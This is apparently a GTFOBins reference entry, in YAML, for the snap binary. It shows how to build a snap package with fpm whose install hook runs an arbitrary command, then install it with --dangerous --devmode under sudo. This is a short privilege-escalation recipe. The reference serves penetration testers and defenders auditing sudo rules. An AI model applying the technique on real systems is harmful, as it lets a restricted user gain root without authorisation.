<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/snap -->
---
functions:
  command:
  - code: |-
      snap install xxxx_1.0_all.snap --dangerous --devmode
    comment: |-
      Generate the Snap package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

      ```
      mkdir -p meta/hooks
      echo -e '#!/bin/sh\n/path/to/command; false' >meta/hooks/install
      chmod +x meta/hooks/install
      fpm -n xxxx -s dir -t snap -a all meta
      ```
    contexts:
      sudo:
...
